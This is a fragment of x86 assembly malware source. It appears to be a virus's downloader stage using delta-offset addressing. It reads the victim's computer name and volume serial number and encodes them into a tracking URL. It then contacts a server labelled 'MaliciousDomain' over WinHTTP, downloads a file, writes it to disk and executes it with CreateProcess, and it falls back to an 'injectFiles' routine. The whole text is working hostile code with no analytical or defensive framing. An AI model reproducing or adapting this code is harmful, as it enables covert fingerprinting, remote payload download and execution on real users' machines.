; WE ARE HERE MASTER ! COME GET ME !
; Get pseudo unique ids
mov	[DELTA LengthName], 10
PDELTA	LengthName
PDELTA	ComputerName
call	[DELTA pGetComputerName]
cmp	eax, 0
je	injectFiles
push	NULL
push	NULL
push	NULL
PDELTA	VolumeID
push	NULL
push	NULL
push	NULL
push	NULL
call	[DELTA pGetVolumeInformation]

; Set the url name & id get info
mov	edi, offset MaliciousUrl2
add	edi, ebp
mov	esi, offset ComputerName
add	esi, ebp
copyName:
lodsb
cmp	eax, 0
je	nameCopied
stosb
mov	eax, 0
stosb
jmp	copyName
nameCopied:
mov	al, '&'
stosb
mov	al, 0
stosb
mov	al, 'i'
stosb
mov	al, 0
stosb
mov	al, 'd'
stosb
mov	al, 0
stosb
mov	al, '='
stosb
mov	al, 0
stosb
mov	eax, [DELTA VolumeID]
mov	ebx, 10
copyVolume:
mov	edx, 0
cmp	eax, 0
je	volumeCopied
div	ebx
mov	ecx, eax
mov	eax, edx
add	eax, 48
stosb
mov	eax, 0
stosb
mov	eax, ecx
jmp	copyVolume
volumeCopied:
stosb
stosb

; Go to our malicious domain
push	0
push	0
push	0
push	0
push	NULL
call	[DELTA pWinHttpOpen]
mov	[DELTA HttpSession], eax
cmp	eax, 0
je	injectFiles
push	0
push	0
PDELTA	MaliciousDomain
PVDELTA	HttpSession
call	[DELTA pWinHttpConnect]
mov	[DELTA HttpConnect], eax
cmp	eax, 0
je	injectFiles
push	0
push	0
push	0
push	NULL
PDELTA	MaliciousUrl
push	NULL
PVDELTA	HttpConnect
call	[DELTA pWinHttpOpenRequest]
cmp	eax, 0
je	injectFiles
mov	[DELTA HttpRequest], eax
push	0
push	0
push	0
push	0
push	0
push	0
PVDELTA	HttpRequest
call	[DELTA pWinHttpSendRequest]
cmp	eax, 0
je	injectFiles
push	NULL
PVDELTA	HttpRequest
call	[DELTA pWinHttpReceiveResponse]
cmp	eax, 0
je	injectFiles

; CreateFile to download
push	0
push	0
push	CREATE_ALWAYS
push	0
push	0
push	GENERIC_WRITE
PDELTA	MaliciousFile
call	[DELTA pCreateFile]
cmp	eax, 0
je	injectFiles
mov	[DELTA PeFile], eax

; Create malicious file downloaded
copyToFile:
PDELTA	Number
push	100
PDELTA	MaliciousUrl2
PVDELTA	HttpRequest
call	[DELTA pWinHttpReadData]
cmp	eax, 0
je	injectFiles
push	0
PDELTA	LengthName
PVDELTA	Number
PDELTA	MaliciousUrl2
PVDELTA	PeFile
call	[DELTA pWriteFile]
cmp	eax, 0
je	injectFiles
mov	eax, [DELTA Number]
cmp	eax, 100
je	copyToFile
launchMalicious:

; Clean everything
call	[DELTA pWinHttpCloseHandle]
PVDELTA	HttpConnect
PVDELTA	HttpRequest
call	[DELTA pWinHttpCloseHandle]
PVDELTA	HttpSession
call	[DELTA pWinHttpCloseHandle]
PVDELTA	PeFile
call	[DELTA pCloseHandle]

; Launch it
mov	eax, offset StartupInfo
add	eax, ebp
mov	edi, SIZEOF(STARTUPINFO)
mov	[eax], edi
PDELTA	ProcessInfo
PDELTA	StartupInfo
push	0
push	0
push	0
push	0
push	0
push	0
push	0
PDELTA	MaliciousFile
call	[DELTA pCreateProcess]

